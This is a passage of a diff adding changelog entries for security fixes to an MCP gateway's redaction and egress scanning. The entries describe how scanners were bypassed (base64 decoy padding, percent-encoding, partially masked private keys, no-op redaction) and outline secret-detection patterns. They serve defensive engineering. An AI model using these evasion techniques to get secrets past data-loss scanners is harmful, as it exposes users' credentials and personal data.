+  buffered + scanned an SSE response ONLY for `tools/call` (CHG-0004); every other method's SSE streamed
+  through UNSCANNED — so a `resources/read` / `prompts/get` result (finite, can carry PII/secrets from the
+  external server, e.g. a code file read containing an API key) egressed RAW over SSE. Added
+  `_EXT_FINITE_RESULT_METHODS` (tools/call + resources/list + resources/read + prompts/list + prompts/get +
+  tools/list) + `_ext_scan_result`; the SSE branch now buffers + scans those finite request/response methods
+  (via `_scan_reframe_sse_tool_result`, which walks the whole result), while `notifications/*` / `*subscribe`
+  / long-lived streams still pass through live (no bounded result; buffering could hang). The non-streaming
+  JSON branch already scanned any method's result; the org path rejects these methods (`-32601`). Files:
+  mcp_proxy.py, test_mcp_bare_proxy_scan.py (+2). Gate: 24 bare-proxy + 1085 broad sweep passed.
+- **CHG-0043** (2026-07-02) [renumbered from CHG-0040 — id collided with the P4.13 Blocker 2 entry below;
+  content unchanged] — G2 item 2 (last unscanned egress vector on the external proxy): the ext-proxy
+  scan only inspected `data.get("result")` / result frames; a JSON-RPC ERROR response (`{"error": {...}}`, no
+  `result`) egressed UNSCANNED, so an untrusted external MCP server could leak a secret in an error message
+  (e.g. `"connect failed: postgres://admin:s3cr3t@db.internal/prod"`, an internal hostname, a token). Both
+  ext-proxy paths (non-streaming branch + `_scan_reframe_sse_tool_result`) now scan the `error` when there is
+  no result — `_scan_tool_result_floor` walks its message/data and masks any detected secret/PII (redact-only,
+  it is already an error); fail CLOSED (withhold) on a scan error; notifications/keep-alives still pass
+  through. Files: mcp_proxy.py, test_mcp_bare_proxy_scan.py (+2). Gate: 26 bare-proxy + 1087 broad sweep
+  passed. ext-proxy egress now fully scanned (result across all shapes + methods, AND error, streaming +
+  non-streaming).
+- **CHG-0041** (2026-07-02) — G2 item 2 (inbound credential guard + logging audit): (1) audited the gateway
+  MCP path for a PII/secret-to-logs leak → CLEAN: `mcp_proxy` logs only `target_url` (allowlisted host, no
+  userinfo), the scan orchestrator logs only exception messages, `metrics.record_bedrock_call` logs
+  method/model/token-counts (no content), and the audit record's raw prompt/response store is off by default —
+  no raw-payload logging. (2) Extended the ext-proxy inbound credential block from `tools/call`-only to
+  `prompts/get` (identical `params.arguments` shape; new `_EXT_ARG_SCAN_METHODS`) so an accidental credential
+  in prompt-template args no longer egresses raw to the external server; `resources/read` is EXCLUDED (its
+  param is a URI — blocking a legit `https://user:token@host` would break authed reads). Removed the dead
+  `_ext_is_tools_call` flag (CHG-0039 left it set-but-never-read). Files: mcp_proxy.py,
+  test_mcp_bare_proxy_scan.py (+1). Gate: 27 bare-proxy + 1088 broad sweep passed.
+- **CHG-0040** (2026-07-02) — P4.13 Blocker 2: `MCPServerRegistration.url` URLField→CharField + migration
+  `0015` so `ws://` registers (serializer `is_safe_outbound_url` unchanged); `ws-everything.stub` added to
+  `MCP_ALLOW_INTERNAL_HOSTS`; ws stub echo `Echo: {message}` parity; P10 agent-pytest timeout 180→360s.
+  4/4 transports PASS ROUNDS=3; gateway ss :443 empty. Cross-seam control (iter39). Evidence:
+  `mcp-parallel/findings/p4-13/RECHECK_ITER39.md`.
+- **CHG-0042** (2026-07-02) — G3/1.4 (OAuth secret at rest): OAuth flow state (PKCE `code_verifier`, CSRF
+  `state`) + access/refresh tokens were persisted to Redis as PLAINTEXT JSON. Added optional Fernet
+  at-rest encryption in `mcp_oauth_proxy.py` (`_oauth_cipher` / `_enc_dumps` / `_enc_loads`, gated on env
+  `MCP_OAUTH_ENCRYPTION_KEY`): default OFF = byte-unchanged plaintext (no behaviour change); key set = new
+  writes encrypted (`gAAAAA` Fernet prefix) while legacy plaintext still reads (prefix-detected, so no
+  stored token is orphaned when the key is first enabled); an invalid key logs a warning and falls back to
+  plaintext (never breaks the OAuth flow). Wired all four persistence sites: `_flow_save` / `_flow_pop` /
+  `_token_save` / `_token_load`. The OAuth callback was re-audited and is CLEAN — CSRF `state` + PKCE
+  `code_verifier` are restored from the stored flow via `_flow_pop`, the token endpoint is checked by
+  `_assert_safe_url` (SSRF guard), and `follow_redirects=False`. Files: mcp_oauth_proxy.py,
+  test_mcp_oauth_encryption.py (new, +4). Gate: 4 oauth-enc + 1092 broad sweep passed.
+- **CHG-0044** (2026-07-02) — G3 item 8 (supply-chain RCE, HIGH): the sandbox sets
+  `npm_config_ignore_scripts=true` on the CONTAINER env (`docker_manager`), but each stdio MCP
+  server is spawned via `create_subprocess_exec(env=_build_child_env(...))` — an explicit `env=`
+  REPLACES the process environment, and `_build_child_env`
+  (`shared/ai_mesh_shared/mcp_stdio_common.py`) rebuilds the child env FRESH from the
+  `_SAFE_ENV_PASSTHROUGH` allowlist, which omits `npm_config_ignore_scripts`. So the `npx` child
+  that actually fetches untrusted packages ran with ignore-scripts defaulting to FALSE →
+  preinstall/install/postinstall lifecycle scripts of a tenant-registered package executed on
+  fetch (no baked `.npmrc` fallback exists; a server-spec `env` could also override). FIX:
+  `_build_child_env` now force-pins `child["npm_config_ignore_scripts"]="true"` unconditionally
+  and LAST (after the server-spec merge, mirroring the `MCP_REMOTE_CONFIG_DIR` pin) so no
+  server-spec/host env can re-enable scripts; the package `bin` (the MCP server) still runs.
+  Touches the broker sandbox agent (`stdio_manager.py`) + gateway legacy stdio adapter
+  (`mcp_stdio_adapter.py`) via the shared helper; complements CHG-0022 (pin/allowlist envs).
+  Files: mcp_stdio_common.py, test_stdio_common.py (+3). Gate: 19 stdio_common + 101 broker +
+  1092 gateway passed. Evidence: `mcp-parallel/findings/backstop-p8-npm-ignore-scripts/`.
+- **CHG-0045** (2026-07-02) — G3 item 9 (audit-completeness, MEDIUM): every tenant-facing MCP route
+  starts with `_validate_org_scope`, which returns 403 `org_scope_violation` when an authenticated
+  key's org ≠ the URL org (a cross-tenant access attempt — the core threat this firewall stops). That
+  403 was only `LOG.warning`'d, NEVER `_record_gateway_event`, so — unlike the per-key authz denials
+  (CHG-0006, which audit) — the most forensically important MCP event was invisible to the MCPEvent
+  audit/SIEM layer. FIX: new async wrapper `_audit_and_return_scope_error` (`mcp_proxy.py`) calls
+  `_validate_org_scope` (UNCHANGED — kept sync so the ~13 `patch.object(...,"_validate_org_scope",
+  return_value=None)` sites + direct-call unit tests stay valid) and on a 403 emits an MCPEvent
+  (`decision=block`, `reason=org_scope_violation`) attributed to the CALLER's real org (`auth.org_slug`,
+  never the target — record stays in the caller's tenant boundary), with `target_org` + `key_prefix` in
+  metadata; all 4 routes now call it. Rate-limit (429) auditing deliberately NOT added (per-rejection
+  audit under a burst would amplify load). Files: mcp_proxy.py, test_mcp_org_scope_data_path.py (+2).
+  Gate: 6 org-scope + 67 route-patch-site + 1094 gateway passed. Evidence:
+  `mcp-parallel/findings/backstop-p9-scope-violation-audit/`.
+- **CHG-0046** (2026-07-02) — G2 item 2 (result-redaction FAIL-OPEN, HIGH): the two-tier scanner flattens
+  each scan target to text via `_safe_json` (so a NUMBER / LIST / OBJECT value IS scanned) and applies
+  redaction by calling the target's `setter(new_text)` (`mcp_scan_orchestrator.py:526`, which also sets
+  `result_redacted=True`). For `key_path` / simple-key targeting a NON-STRING value the setter was a NO-OP
+  (`mcp_scan_targets.py:108` dot-path `lambda: None`, `:123` simple-key `lambda: None`) — so a detected
+  secret/PII in a numeric/list/object value was **reported redacted yet egressed RAW**, and because
+  `result_redacted=True` flips the returned object identity, the E12 result-floor was BYPASSED
+  (`_scan_tool_result_floor` only re-scans when `scanned is result_content`). Violates "fail closed on a
+  no-op scrub / never report-redact while forwarding-raw". FIX: bind the SAME real mutators the string
+  targets use — dot-path via `_mutate_dot_path` (hoisted `_make_setter`), simple-key via in-place
+  `node[key] = new` — so redaction replaces the value with the masked string; clean values untouched
+  (setter fires only when `new_text != text`). Entire-mode (default) was already correct. Files:
+  mcp_scan_targets.py, test_mcp_scan_targets.py (+3), test_mcp_scan_orchestrator.py (+1 e2e). Gate: 39
+  scan-target/orchestrator + 1098 gateway passed. Evidence:
+  `mcp-parallel/findings/backstop-p2-nonstring-redact-setter/`. Follow-up: a general fail-closed OUTPUT
+  byte-check in `_scan_tool_result_floor` would backstop any residual no-op scrub.
+- **CHG-0047** (2026-07-02) — G2 item 2 (byte-truth invariant, defense-in-depth): IMPLEMENTS the CHG-0046
+  follow-up. `scan_mcp_payload` sets `result_redacted=True` whenever `new_text != text` regardless of
+  whether the target `setter` actually mutated the payload; CHG-0046 fixed the KNOWN non-string setters but
+  `_mutate_dot_path` is best-effort for exotic nested-list paths, so a residual silent no-op scrub could
+  still egress the raw value while the audit records `decision=redact`. FIX: in the Tier-1 redact branch,
+  snapshot `_safe_json(state_ref[0])` before/after `setter(new_text)`; if the payload BYTES are unchanged
+  the scrub was a no-op → `tier1_blocked=True` (+ a `noop_scrub_failclosed` scan-trace stage) → the whole
+  result blocks (`result.blocked=True`), so `_scan_tool_result_floor` callers withhold it. General (catches
+  ANY setter that fails to apply), precise (compares actual bytes — no out-of-scope false positives, no
+  dependence on a finding carrying a raw value), cheap (one extra serialize per redacted target, only when
+  sensitive data was detected); a setter that DOES apply changes the bytes → not blocked. Files:
+  mcp_scan_orchestrator.py, test_mcp_scan_orchestrator.py (+2). Gate: 41 scan-orchestrator/target + 1100
+  gateway passed (ZERO spurious blocks on legitimate redaction). With CHG-0003 (fail-closed on scan error) +
+  CHG-0046 (real non-string setters), the redaction path is now fail-closed on scan-error, setter-no-op, AND
+  the known non-string shapes. Evidence: `mcp-parallel/findings/backstop-p2-noop-scrub-failclosed/`.
+- **CHG-0048** (2026-07-02) — G3 item 11 (Redis correctness, MEDIUM): the per-key tool-call cap counter
+  (`_incr_tool_call_count`) did `count = INCR(rk); if count == 1: EXPIRE(rk, 60)`. The window TTL was set
+  ONLY on the first increment, so a crash / dropped connection / failed EXPIRE at that moment left
+  `mcp:toolcalls:<key>` with NO TTL forever — later calls (count>1) skip the EXPIRE, the counter never
+  resets, and once `count > mcp_max_tool_calls` the key is 429'd on EVERY tool call permanently until the
+  Redis key is manually deleted. Non-atomic read-modify-write. FIX: INCR + `EXPIRE(nx=True)` run ATOMICALLY
+  in a `pipeline(transaction=True)` (MULTI/EXEC) on every increment; `NX` (Redis 7+, deployed image
+  `redis:7.4-alpine`) sets the TTL only when absent → the FIXED 60s window is preserved (never extended, so
+  not a sliding window) and a lost TTL is HEALED on the next call. Fail-open on Redis error unchanged (soft
+  cap). Mirrors the existing atomic-Redis idiom in `rate_limiter.py`. Existing cap tests mock the function
+  wholesale, so unaffected. Files: mcp_proxy.py, test_mcp_tool_call_cap_ttl.py (new, +5 — REAL fakeredis:
+  atomic-set / fixed-window / TTL-heal / fail-open). Gate: 5 cap-ttl + 37 existing-cap + 1105 gateway
+  passed. Evidence: `mcp-parallel/findings/backstop-p11-toolcall-cap-ttl-race/`.
+- **CHG-0049** (2026-07-02) — G3 item 11 (verification + regression guard, no production code change):
+  followed up CHG-0048 by sweeping EVERY Redis WRITE in the MCP surface for the same TTL-race / non-atomic
+  class of bug. Findings — all CLEAN: (1) `_flow_save` = atomic `setex(_FLOW_TTL=600)` + `delete` on pop
+  (used-once CSRF/PKCE state, no replay); (2) `_token_save` = atomic `setex` with a TTL DERIVED from the
+  access token's `expires_at` (`max(int(expires_at-now)+60, 300)`, bumped to `_TOKEN_DEFAULT_TTL` when a
+  `refresh_token` exists so it survives to rotate); (3) tool-call cap counter atomic since CHG-0048; (4)
+  `mcp:scan_ver:*` is READ-ONLY on the gateway (written by the control plane). No new race. Pinned the
+  previously-untested `_token_save` expiry-derived TTL with +4 tests — a refactor to a fixed TTL would
+  silently serve EXPIRED access tokens (TTL > token) or evict valid ones early (TTL < token). Documented as
+  a non-issue: the in-process `_oauth_tokens` fallback returning an expired record is BY DESIGN
+  (`get_stored_token` re-checks `expires_at`/refreshes; `has_stored_token` intentionally reports existence),
+  and its size is bounded by config cardinality (not request volume). Files: test_mcp_oauth_token_ttl.py
+  (new, +4). Gate: 4 oauth-ttl + 1109 gateway passed. Evidence:
+  `mcp-parallel/findings/backstop-p11-redis-write-audit/`.
+- **CHG-0050** (2026-07-02) — G4 item 13 (request correlation / tracing, LOW-MED; not a leak):
+  `_record_gateway_event` defaults `request_id` to a throwaway `mcp-<ms>` timestamp. The bare REST route
+  `org_mcp_tool_call` recorded ALL its audit events with NO `request_id`; `org_mcp_jsonrpc` used the
+  client-controlled, repeatable JSON-RPC id only on its main sites; and NEITHER route honored an inbound
+  `X-Request-ID` — so a single tool call's block/redact/tag decisions couldn't be correlated across the
+  audit trail or with gateway → broker → sandbox logs. FIX: new `_mcp_request_correlation_id(request,
+  msg_id=None)` prefers the inbound `X-Request-ID` (bounded to 200 chars vs a hostile header), then the
+  JSON-RPC id, else `""`. Threaded into ALL 5 audit events of the bare REST route (was zero); the JSON-RPC
+  route's `_req_id` now uses it (honors `X-Request-ID` over the repeatable JSON-RPC id). Robust to a request
+  without `.headers`. Files: mcp_proxy.py, test_mcp_bare_proxy_scan.py (+6). Gate: 33 bare-proxy + 1115
+  gateway passed. Follow-ups (documented): thread `_req_id` into `org_mcp_jsonrpc`'s early authz sites +
+  `internal_tools_call`; propagate into `broker_send_rpc` for cross-service tracing; OTEL/Jaeger + PG/Redis
+  backup remain infra (item 13 stays `[ ]`). Evidence:
+  `mcp-parallel/findings/backstop-p13-request-correlation-id/`.
+- **CHG-0051** (2026-07-02) — G4 item 13 (end-to-end tracing; completes the CHG-0050 follow-up): CHG-0050
+  gave MCP audit events a per-request correlation id (from `X-Request-ID`), but `broker_send_rpc` sent NO
+  correlation id to the broker — so the broker + sandbox logs for a tool call couldn't be tied back to the
+  gateway MCPEvent audit (the trace ended at the gateway boundary). FIX (out-of-band `X-Request-ID` header,
+  no JSON-RPC payload-schema change): `_request_with_503_retry` gains `extra_headers` (merged with the broker
+  auth headers, built once + reused across 503 retries); `broker_send_rpc` gains `correlation_id` and sends
+  `X-Request-ID: <id>` when set (no header when unset); `_adapter_forward` gains `correlation_id` (default
+  "") and passes it through; the `org_mcp_jsonrpc` tool-call site passes `correlation_id=_req_id`. A
+  remote-transport tool call now carries the gateway correlation id to the broker + sandbox. Additive params
+  with defaults — other callers unchanged. Files: mcp_sandbox_client.py, mcp_proxy.py,
+  test_mcp_sandbox_client.py (+2). Gate: 13 sandbox-client + 1117 gateway passed. Follow-ups: stdio branch
+  (`send_jsonrpc`); tools/list + `internal_tools_call` + early authz sites; broker should LOG the received
+  `X-Request-ID`; OTEL/Jaeger + backup remain infra (item 13 stays `[ ]`). Evidence:
+  `mcp-parallel/findings/backstop-p13-broker-correlation-propagation/`.
+- **CHG-0052** (2026-07-02) — G4 item 13 (completes CHG-0051): CHG-0051 propagated the correlation id to the
+  broker as an `X-Request-ID` header, but the broker's RPC route (`sandbox_rpc` / `stdio_rpc` →
+  `_forward_sandbox_rpc`) neither read nor logged it — the broker RPC path had NO per-call logging at all — so
+  the propagated trace was invisible on the broker side. FIX (`services/mcp-broker/src/sandbox/routes.py`):
+  added `LOG = logging.getLogger("mcp_broker.sandbox_rpc")`; both RPC routes capture
+  `x_request_id = Header(default=None, alias="X-Request-ID")` and pass it to `_forward_sandbox_rpc(...,
+  request_id=...)`, which logs ONE line at the top (before docker/sandbox resolution, so failed 503 calls are
+  traced too): `sandbox rpc org=… server=… transport=… method=… jsonrpc_id=… request_id=…`. PII-SAFE: logs
+  ONLY metadata — never `params`/`stdio`/`upstream`/`command`/`args`/`env` (can carry PII/secrets; mirrors
+  CHG-0041); `-` placeholder when no header. Trace chain now complete to the broker: gateway audit (CHG-0050)
+  → X-Request-ID (CHG-0051) → broker log (CHG-0052). `_post_agent_rpc` untouched. Files: routes.py,
+  test_broker_auth.py (+2). Gate: 106 broker passed. Follow-ups: forward `X-Request-ID` to the sandbox AGENT +
+  agent-log (last hop); gateway stdio/tools-list/internal/early-authz sites; OTEL/Jaeger + backup infra (item
+  13 stays `[ ]`). Evidence: `mcp-parallel/findings/backstop-p13-broker-logs-correlation-id/`.
+- **CHG-0053** (2026-07-02) — item 13 / 1.4 (sandbox-agent leak-to-logs audit + fix): extended the CHG-0041
+  gateway-logging audit to the broker + sandbox AGENT (prompted by the CHG-0052 broker logging). AUDIT
+  result: tool-call RESULTS/params are NEVER logged (the 1.4-critical property holds); the only server result
+  logged is the `initialize` result (capabilities, `json.dumps`-escaped + truncated — acceptable); broker
+  `_forward_sandbox_rpc` logs metadata only (CHG-0052). GAP: `stdio_manager.py:360` logged `command` + `args`
+  verbatim at INFO — `env` (the normal secret store) is never logged, but a credential passed as a stdio ARG
+  (`--token XYZ` / `--api-key=XYZ`) would land in operator logs in plaintext. FIX: new `_safe_args_for_log()`
+  masks the VALUE of any secret-looking flag (`token`/`key`/`secret`/`password`/`passwd`/`auth`/`credential`/
+  `apikey`) — `--token XYZ` → `["--token","***"]`; standalone URLs/package specs left intact. Files:
+  stdio_manager.py, test_stdio_manager_packages.py (+5). Gate: 31 stdio-pkg + 106 broker passed (no test
+  depends on the log format). Follow-up: URL-embedded creds in a standalone arg (separate vector). Evidence:
+  `mcp-parallel/findings/backstop-p13-broker-agent-log-hygiene/`.
+- **CHG-0054** (2026-07-02) — G2 item 2 / 1.4 (HIGH secret leak; found via an adversarial 1.4 verification):
+  `redact_all` masked ONLY the `-----BEGIN … PRIVATE KEY-----` header line (→ `[PRIVATE_KEY]`), leaving the
+  base64 key BODY + `-----END-----` intact — the body is the actual secret material, and `[PRIVATE_KEY]` is
+  trivially replaced with the fixed BEGIN line to reconstruct the key. The old pattern also only matched
+  **RSA**, so EC/DSA/OPENSSH keys were not matched at all (whole key egressed raw). Root cause: in
+  `_redact_all_raw`, `PII_PATTERNS` (`private_key_header`) runs first and masks the BEGIN header, so the later
+  header-only `private_key_block` (CREDENTIAL_EXPOSURE_PATTERNS) never matched the multi-line body. FIX:
+  `private_key_header` now matches the ENTIRE PEM block (generic `(?:[A-Z0-9]+\s+)?` prefix covers
+  RSA/EC/DSA/OPENSSH/ENCRYPTED; `…BEGIN…(?:[\s\S]*?…END…|[A-Za-z0-9+/=\s]*)` masks a complete block or a
+  truncated key's body) → the masker `[PRIVATE_KEY]` replaces the whole key; prose ("loads a private key") is
+  NOT redacted (no false positive). ORACLE NOTE: `aidefence_scan`/`aidefence_has_pii` return `piiFound:false`
+  on BOTH the raw AND redacted key (no PEM-key recognizer) — NOT a substitute oracle; confirmation is via the
+  gateway's own `detect_pii` (flags `private_key_header`) + byte inspection. Files: patterns.py,
+  test_private_key_redaction.py (+5). Gate: 5 pk-redaction + 74 redaction-adjacent + 1122 gateway passed.
+  Follow-up: `detect_secrets` inventory omits private keys (`detect_pii` covers them) — inventory-unification
+  is cross-plane. Evidence: `mcp-parallel/findings/backstop-p2-private-key-body-leak/`.
+- **CHG-0055** (2026-07-02) — G2 item 2 / 1.4 (secret-inventory gap, MEDIUM; found continuing the CHG-0054
+  adversarial 1.4 verification): the secret inventory redacted `password=` / `secret=` / `token=`
+  assignments but had NO `api_key=` / `apikey=` / `access_key=` pattern — so an `API_KEY=<value>` whose value
+  did not match a provider-specific format (OpenAI `sk-`+32, AWS `AKIA…`, Google `AIza…`, Slack, Stripe…)
+  egressed UNMASKED (`api_key=` / `apikey:` / `access_key=` / `api-key =` all cases survived). FIX: new
+  `api_key_assignment` = `(?:api[_-]?key|access[_-]?key)["\s]*[:=][\s"\']*` + `_TOKEN_VALUE`, mirroring
+  `token_assignment`; reuses the `_TOKEN_VALUE` FP guard (>=8 chars w/ a digit, not an instructional prose
+  word) so `api_key=none` / `api key: forgotten?` / `api_key=` (empty) / `DEBUG=true` are NOT masked; tagged
+  `["SECRET"]`; masked via the generic `_mask_secret_assignment` → `api_key=***`; case-insensitive.
+  `detect_secrets` now flags `api_key_assignment`. Files: patterns.py, test_api_key_assignment_redaction.py
+  (+13). Gate: 13 api-key + 1135 gateway passed. Evidence:
+  `mcp-parallel/findings/backstop-p2-api-key-assignment-gap/`.
+- **CHG-0056** (2026-07-02) — G2 item 2 / 1.4 (URL-encoding obfuscation bypass, MEDIUM; found continuing the
+  CHG-0054/0055 adversarial 1.4 verification of the encoding-obfuscation surface): `redact_all` →
+  `_redact_obfuscated` de-obfuscated base64 / hex / url-safe-base64 / double-base64 (all caught) but did NOT
+  URL-decode — so `john.doe%40example.com` (email in a URL query param) or a %-encoded SSN (`123%2d45%2d6789`)
+  broke the raw patterns (`@`→`%40`, `-`→`%2d`) and the token egressed (trivially recoverable). FIX: a
+  percent-decode pass — for each token carrying a `%XX` escape (`_PERCENT_TOKEN_RE`, bounded to
+  `_MAX_URL_DECODE_TOKENS=32` decode-bomb-safe), `urllib.parse.unquote` it and, if the decoded form matches
+  PII/secret, mask the whole token `[ENCODED_SECRET_REDACTED]`. Only masks when decoded PII/secret is found,
+  so benign percent text (`50%20off`→"50 off", `C%3A%5Cpath`, `95%`, `?p=2%2C3`) is untouched. base64/hex +
+  plain-PII behaviour unchanged. Files: patterns.py, test_url_encoding_redaction.py (+11). Gate: 11 url-enc +
+  1158 gateway passed. DOCUMENTED RESIDUAL (CLOSED by CHG-0060 2026-07-02): the base64/hex decode cap
+  `_MAX_DECODE_TOKENS=12` (a DoS bound) let a crafted result pad 12+ decoy base64 tokens to hide the real
+  encoded secret past the cap. Evidence: `mcp-parallel/findings/backstop-p2-url-encoding-obfuscation/`.
+- **CHG-0057** (2026-07-02) — G2 item 2 / 1.4 (fail-closed byte-truth + E2E verification): VERIFIED that the
+  MCP tool-result redaction path (`scan_mcp_payload` → `_scan_text_tier1` PII/secret branch) detects with
+  `detect_pii`/`detect_secrets`/`detect_ip_leakage` and masks with `redact_all` — ALL from `patterns.py` — so
+  CHG-0054/0055/0056 DO protect real MCP tool results end-to-end (tier1 is patterns-based; Presidio is tier2
+  only). GAP: the tier1 redact branch's fail-closed "detected-value-survives-the-scrub → block" byte-check
+  checked ONLY `ip_leak.values()`, with a comment ASSUMING "PII/secret always covered by redact_all" — an
+  assumption CHG-0054 (private-key body) showed can be violated by a masker bug. FIX: byte-verify ALL detected
+  categories — `_detected_values = list(pii.values()) + list(secrets.values()) + list(ip_leak.values())`; any
+  survivor in the scrub → `blocked=True`. NO false positives: `redact_all` replaces every detected match, so a
+  detected raw value is never a substring under normal operation — verified over the full PII/secret battery.
+  Files: mcp_scan_orchestrator.py, test_mcp_scan_orchestrator.py (+2). Gate: 2 chg0057 + 1160 gateway passed
+  (excluding another session's untracked, incomplete `test_mcp_enforcement_block_recording.py`, undefined
+  `_rest_request` helper — unrelated). Evidence: `mcp-parallel/findings/backstop-p2-tier1-byte-verify-all/`.
+
+- **CHG-0058** (2026-07-02) — G2 / 1.4 (encoded internal-network-address leak, HIGH; found continuing the
+  CHG-0054/0055/0056/0057 adversarial obfuscation sweep): `redact_all` de-obfuscates base64/hex (G2) and
+  URL/percent (CHG-0056) blobs, but the decode branches in `_redact_obfuscated` checked only
+  `_detect_pii_core`/`_detect_secrets_core` — NOT `detect_ip_leakage`. So an INTERNAL network address inside an
+  encoded blob (`base64("db.internal:5432")`, `base64("http://192.168.50.123:8080/admin")`, `%`-encoded internal
+  URL) survived scrubbing and egressed verbatim (trivially recoverable). SECONDARY gap found while fixing: the
+  shared base64 gate `_B64ISH_RE` needs `{12,}` chars (~>=9 bytes), so a BARE short internal IPv4 (`10.1.2.3` →
+  `MTAuMS4yLjM=`, 11 base64 chars) fell just under and still leaked (hex short-IPs already covered: 8 bytes = 16
+  hex >= the `{8,}` floor). FIX: (1) `_dec_has_infra()` (scoped to NETWORK keys `internal_ipv4`/`internal_hostname`/
+  `internal_url`; file-path leak types excluded — flag-tier + FP-prone) added to the base64/hex decode branch and
+  the URL-decode branch → mask the whole token `[ENCODED_SECRET_REDACTED]`. (2) `_SHORT_B64_RE` +
+  `_iter_short_b64_infra()` — a dedicated SHORT-token pass (maximal run of 8..11 base64 chars, the band the main
+  gate misses) that decodes and masks ONLY internal network addresses; network-key-only so it changes NOTHING
+  about `detect_pii`/`detect_secrets`, only tightening the fail-closed redaction path; look-behind/look-ahead pin
+  maximal runs (12+ char tokens stay with the main pass); token count bounded (decode-bomb safe). NO false
+  positives: the `_IP_LEAKAGE_EXAMPLE_ADDRS` textbook carve-out (192.168.0.1, 10.0.0.1, …) is preserved on the
+  decode path; encoded file paths untouched; FP battery over benign short-base64 text → ZERO changed. Integrates
+  with CHG-0057's byte-verify guard (it already unions `ip_leak.values()` → a surviving internal address fails
+  closed → block). Files: patterns.py, test_encoded_infra_redaction.py (+13). Gate: 13 encoded-infra + 1176
+  gateway passed, 0 failed. Evidence: `mcp-parallel/findings/backstop-p2-encoded-infra-leak/`.
+
+- **CHG-0059** (2026-07-02) — G2 item 5 / 1.4 (compliance-tag vocabulary unified onto catalog codes,
+  MEDIUM audit-integrity; closes the CHG-0017/CHG-0030 vocab residual): `MCPEvent.compliance_tags` is
+  documented (models.py:309) as a list of `ComplianceTag.code` values
+  (`GDPR-PII/HIPAA-PHI/PCI-CARD/SOC2-CONF/...`). The control enforcement path (`_record_event` via
+  `tags_for_preset_or_entity`) already emits catalog codes, but the GATEWAY scan path (`patterns.py`
+  `get_compliance_tags`) emits a GRANULAR vocabulary (`GDPR/HIPAA/PII/PHI/PCI-DSS/SECRET/INFRA/SOC2`) —
+  so the SAME audit field held two vocabularies depending on which plane recorded the event (an SSN leak
+  → control `['GDPR-PII','HIPAA-PHI']` vs gateway `['GDPR','HIPAA','PII']`), breaking any group/filter/
+  join-by-tag and violating the field's own contract. (No live catalog-join exists yet — frontend just
+  displays the tags — so latent-but-real audit-integrity.) The shared module also had NO internal-infra
+  keys (item 5's literal "extend to IP"). FIX — normalize at the audit WRITE boundary (NOT the gateway
+  source, so ZERO gateway changes: the 8 gateway compliance tests stay green + no collision with active
+  patterns.py editors): `shared/ai_mesh_shared/mcp_compliance_tags.py` gains `to_catalog_codes()`
+  (GDPR/PII→GDPR-PII, HIPAA/PHI→HIPAA-PHI, PCI-DSS→PCI-CARD, SECRET/INFRA/SOC2→SOC2-CONF; IDEMPOTENT;
+  unknown tokens pass through — never drops a tag) + `CATALOG_TAG_CODES` + internal-infra `PRESET_TO_TAGS`
+  keys (`internal_ipv4/internal_hostname/internal_url/file_path_unix/file_path_windows/ip_leakage` →
+  `SOC2-CONF`). `control/.../mcp_connector/tasks.py` `record_mcp_event_task` (gateway ingestion) +
+  `views.py` `_record_event` (defense-in-depth) apply it, exception-guarded (audit must never break).
+  Now every MCPEvent write upholds the catalog-code contract regardless of plane. Files:
+  mcp_compliance_tags.py, tasks.py, views.py, test_compliance_tag_catalog_vocab.py (+31),
+  test_compliance_tag_ingest_normalization.py (+6). Gate: 31 gateway vocab + 1207 gateway sweep passed,
+  0 failed; control mcp_connector 6 ingestion + 21 broader passed via the Django runner in a throwaway
+  container (working-tree bind-mount on the compose network+DB), gateway envelope `['GDPR','HIPAA','PII']`
+  PERSISTS as `['GDPR-PII','HIPAA-PHI']` (2 unrelated pre-existing harness errors: pytest/fakeredis dev
+  deps absent). RESIDUALS (non-blocking): ITAR/FERPA have no detector; gateway still emits granular at
+  source (consistency enforced at the write boundary by design); ideal future = shared `CATALOG_TAG_CODES`
+  as single source-of-truth imported by control's `policy/compliance_tags.py`. Evidence:
+  `mcp-parallel/findings/backstop-p5-compliance-vocab-normalize/`.
+
+- **CHG-0060** (2026-07-02) — G2 / 1.4 (decode-scan decoy-padding bypass, HIGH; CLOSES the CHG-0056
+  residual): the base64/hex/url decode passes in `_redact_obfuscated` stopped after a fixed token COUNT
+  (base64/hex `_MAX_DECODE_TOKENS=12`, url `_MAX_URL_DECODE_TOKENS=32`), so a tool result could hide an
+  encoded secret PAST the cap — `<12 benign base64 blobs> <base64("john.doe@example.com")>` — and the
+  secret token was never decoded, so it egressed verbatim (trivially recoverable). Proven live pre-fix
+  (base64/hex past 12 decoys, url past 32); not purely adversarial (any legit result with >12 encoded
+  fields where a later one carries encoded PII leaks). FIX — bound the decode scan by a GLOBAL decoded-BYTE
+  budget (`_MAX_DECODE_TOTAL_BYTES=262144`, shared across the base64+hex passes) instead of a per-pass
+  token COUNT: the input is already capped at `_CANON_MAX_LEN=20000`, so decoding EVERY token in it is
+  inherently bounded work; the byte budget is the real DoS bound (caps total decoded bytes incl. nested
+  layers). `_MAX_DECODE_TOKENS` raised 12→4096 (high backstop above the ~1666 max base64 tokens a 20K input
+  holds → never truncates a valid input); `_MAX_URL_DECODE_TOKENS` 32→4096 + the URL pass now scans
+  `original[:_CANON_MAX_LEN]`. `_iter_transport_decodes` decrements the budget per decoded blob (top+nested)
+  and stops when exhausted; `_iter_short_b64_infra` (CHG-0058) inherits the raised cap. NO FP: benign short
+  input is a byte-for-byte no-op (golden cases unchanged); scanning more tokens only masks GENUINE decoded
+  PII/secret/infra (60-benign-decoy battery not false-masked); perf worst case (full 20K base64 window)
+  ~35-45ms. Files: patterns.py, test_decode_budget_no_decoy_bypass.py (+7). Gate: 7 decoy-bypass + 1214
+  gateway passed, 0 failed. Integrates with CHG-0057 byte-verify (a surviving detected value still fails
+  closed → block). RESIDUAL (pre-existing, NOT changed): content beyond `_CANON_MAX_LEN=20000` is not
+  obfuscation-decode-scanned (plain PII beyond is still raw-masked; only ENCODED content past 20K escapes).
+  Evidence: `mcp-parallel/findings/backstop-p2-decode-decoy-bypass/`.
+
+- **CHG-0061** (2026-07-02) — G2 item 2 / 1.4 (ext_mcp_proxy non-200 / non-JSON egress leak, HIGH): the
+  tenant-facing external MCP passthrough `ext_mcp_proxy` (`/v1/mcp/ext-proxy/{host}/{path}`, behind auth;
+  CHG-0032/0033/0034/0043 lineage) applied its outbound result/error redaction floor ONLY to
+  `status_code == 200` JSON bodies. Two paths forwarded the untrusted external server's body RAW: (1) a
+  NON-JSON body (`resp.json()` raises — HTML error page, `text/plain` error, XML fault) was returned
